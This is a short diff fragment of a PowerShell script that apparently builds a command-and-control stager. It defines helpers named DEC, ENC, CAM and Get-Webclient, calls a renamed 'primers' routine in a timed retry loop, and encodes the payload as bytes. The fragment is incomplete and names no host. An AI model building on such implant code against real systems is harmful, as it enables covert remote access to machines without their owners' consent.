@@ -35,12 +35,13 @@ function DEC {${function:DEC}}
 function ENC {${function:ENC}}
 function CAM {${function:CAM}}
 function Get-Webclient {${function:Get-Webclient}}
-function primer {${function:primer}}
-primer
+function primern {${function:primern}}
+function primers {${function:primers}}
+primers
 Start-Sleep 300
-primer
+primers
 Start-Sleep 600
-primer
+primers
 "@
 
 $ScriptBytes = ([Text.Encoding]::ASCII).GetBytes($payloadclear)
